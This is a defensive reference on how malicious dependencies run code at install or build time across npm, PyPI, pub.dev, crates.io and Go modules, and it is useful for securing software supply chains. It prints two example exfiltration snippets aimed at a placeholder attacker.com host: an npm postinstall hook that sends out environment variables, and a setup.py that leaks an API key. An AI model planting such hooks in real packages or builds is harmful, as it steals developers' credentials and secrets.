# Ecosystem Attack Vectors Reference

This reference documents how malicious dependencies execute code during the installation lifecycle across major programming language package registries.

---

## 1. Node.js / npm Ecosystem

The npm ecosystem is the most vulnerable to instant compromise because lifecycle scripts execute automatically during `npm install` unless explicitly disabled.

### Critical Execution Vectors:
- **`postinstall` & `preinstall` scripts**:
  ```json
  "scripts": {
    "postinstall": "node -e 'require(\"http\").get(\"http://attacker.com/pwned?t=\"+encodeURIComponent(process.env))'"
  }
  ```
  *Impact*: Immediate exfiltration of all environment variables (including `AWS_ACCESS_KEY_ID`, `GITHUB_TOKEN`, `DATABASE_URL`) without the developer ever importing or running the package in source code.
- **`install` scripts inside binary wrappers**: Native C++ addons using `node-gyp` or prebuilt binary downloaders that execute arbitrary curl scripts to download uninspected binaries.
- **Dependency Confusion**: Registering public npm packages with the same name as internal corporate private packages (e.g., `@internal/auth-client`).

### Defense:
Run untrusted installations with `--ignore-scripts`:
```bash
npm install --ignore-scripts
```

---

## 2. Python / PyPI Ecosystem

Python packages have historically executed arbitrary code via `setup.py` upon download.

### Critical Execution Vectors:
- **`setup.py` Execution**:
  When installing an sdist (source distribution), `pip install` executes `setup.py`. Attackers place reverse shells or token snatchers inside `setup.py`:
  ```python
  from setuptools import setup
  import os, urllib.request
  urllib.request.urlopen("https://attacker.com/leak?" + os.environ.get("OPENAI_API_KEY", ""))
  setup(name="hallucinated-package", version="0.1.0")
  ```
- **Malicious `.whl` (Wheel) Files**:
  While wheels do not run `setup.py` at install time, they execute malicious code immediately upon the first `import` statement in `__init__.py`.

---

## 3. Flutter / Dart (pub.dev)

`pub.dev` does not execute arbitrary shell scripts during `flutter pub get`. However, runtime vectors exist:

### Critical Execution Vectors:
- **Unverified Publishers**: Anyone with a Google account can publish an unverified package on pub.dev. Look for the "Verified Publisher" checkmark.
- **Asset Bundle Smuggling**: Hiding malicious payload executables inside the package's `assets/` directory and triggering execution via Dart FFI or platform channels at runtime.

---

## 4. Rust / crates.io

Rust executes arbitrary Rust code during compilation if a crate contains a `build.rs` script.

### Critical Execution Vectors:
- **`build.rs` execution**: Runs on the developer's host machine during `cargo build` with full filesystem and network access.
- **Proc Macro Abuse**: Procedural macros execute code during compilation at compile time inside the compiler process.

---

## 5. Go Modules

Go modules are generally safer because `go get` fetches source code without running build scripts automatically.

### Critical Execution Vectors:
- **Repository Hijacking / Deletion**: If an upstream GitHub user deletes their account, an attacker can register the abandoned username and push backdoored code to the same module import path before Go proxy checksums lock in.
